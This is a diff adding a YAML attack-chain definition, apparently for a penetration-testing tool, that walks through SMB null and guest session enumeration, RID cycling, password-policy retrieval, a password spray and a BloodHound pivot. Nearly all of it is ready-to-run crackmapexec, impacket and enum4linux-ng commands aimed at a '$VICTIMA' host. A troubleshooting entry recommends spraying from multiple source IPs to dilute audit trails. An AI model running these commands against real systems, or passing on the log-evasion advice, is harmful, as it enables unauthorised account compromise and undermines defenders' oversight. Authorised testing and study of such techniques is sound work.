@@ -1,0 +1,70 @@
+chain_id: smb_null_session_enum
+title: "SMB — null / guest session → user list → password spray"
+severity: MEDIUM
+tags: [smb, null-session, enumeration, password-spray, ad, day-one]
+
+trigger:
+  any_of:
+    - { service_pattern: "(?i)microsoft-ds|netbios-ssn|samba" }
+    - { port_in: [139, 445] }
+    - { banner_pattern: "(?i)samba|windows" }
+
+description: |
+  Pre-Server-2008 (and many misconfigured Sambas / Windows boxes) let
+  an unauth SMB session bind to LSARPC / SAMR and enumerate users.
+  Even on hardened Windows the *guest* session sometimes survives, or
+  RID-cycling works. End state: a real user list, ready for a
+  conservative password spray that won't lock anyone out. The first
+  unauth move on every internal engagement.
+
+steps:
+  - id: 1
+    title: "Probe null & guest sessions"
+    command: |
+      crackmapexec smb $VICTIMA -u '' -p ''
+      crackmapexec smb $VICTIMA -u 'guest' -p ''
+      smbmap -H $VICTIMA -u '' -p ''
+      enum4linux-ng -A $VICTIMA
+
+  - id: 2
+    title: "RID cycling — pulls users even if SAMR enum is locked"
+    command: |
+      crackmapexec smb $VICTIMA -u '' -p '' --rid-brute 5000
+      impacket-lookupsid '@'$VICTIMA 30000
+
+  - id: 3
+    title: "Pull the password policy (don't lock the domain out)"
+    command: |
+      crackmapexec smb $VICTIMA -u '' -p '' --pass-pol
+      enum4linux-ng -P $VICTIMA
+
+  - id: 4
+    title: "Conservative spray — one password, all users, respect lockout"
+    command: |
+      crackmapexec smb $VICTIMA -u users.txt -p 'Spring2026!' \
+        --continue-on-success --no-bruteforce
+      # Watch lockout threshold: pause for the policy's reset window
+      # between rounds.
+
+  - id: 5
+    title: "Once you land any auth — pivot to richer enum"
+    command: |
+      bloodhound-python -u FOUND_USER -p 'Spring2026!' -d DOMAIN -c All -ns $DC_IP
+      crackmapexec smb $SUBNET -u FOUND_USER -p 'Spring2026!' --shares
+
+common_errors:
+  - error: "All probes return STATUS_ACCESS_DENIED"
+    solution: |
+      `RestrictAnonymous=2` enforced. Pivot to LDAP anonymous bind
+      (port 389) — sometimes still readable when SMB is locked, and
+      gives the same user list.
+  - error: "Spray locks accounts immediately"
+    solution: |
+      You skipped step 3. Re-pull the policy and stay at
+      `MaxBadPwd - 1` per reset window. Better: spray from multiple
+      source IPs to dilute audit trails (not lockout — lockout is
+      counted per-account, not per-source).
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+  - https://www.thehacker.recipes/ad/recon/null-session
